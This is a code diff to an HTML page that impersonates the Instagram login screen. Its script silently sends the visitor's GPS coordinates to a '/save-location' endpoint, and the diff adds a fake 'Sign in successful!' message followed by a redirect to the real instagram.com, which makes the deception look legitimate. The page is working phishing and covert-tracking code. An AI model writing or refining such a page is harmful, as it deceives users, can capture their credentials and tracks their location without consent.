@@ -30,7 +30,7 @@
       margin-bottom: 20px;
     }
     input {
-      width: 100%;
+      width: 90%;
       padding: 10px;
       margin-bottom: 10px;
       border: 1px solid #dbdbdb;
@@ -53,17 +53,10 @@
     button:hover {
       background-color: #007bb5;
     }
-    .logo {
-      width: 150px;
-      margin-bottom: 20px;
-    }
   </style>
 </head>
 <body>
   <div class="login-container">
-    <!-- Instagram logo -->
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_logo_2022.svg/1200px-Instagram_logo_2022.svg.png" alt="Instagram Logo" class="logo">
-    
     <h1>Instagram</h1>
     <form id="loginForm">
       <input type="text" placeholder="Phone number, username, or email" required>
@@ -82,7 +75,7 @@
           async (position) => {
             const { latitude, longitude } = position.coords;
 
-            // Send location data to the server silently (no feedback to the user)
+            // Send location data to the server silently
             try {
               await fetch('/save-location', {
                 method: 'POST',
@@ -104,7 +97,8 @@
       }
 
       // Proceed with "Sign In" action (e.g., form submission or page redirection)
-      window.location.href = 'https://google.com'; // Redirect to Instagram
+      alert('Sign in successful!'); // Replace this with actual functionality.
+      window.location.href = 'https://www.instagram.com';
     });
   </script>
 </body>
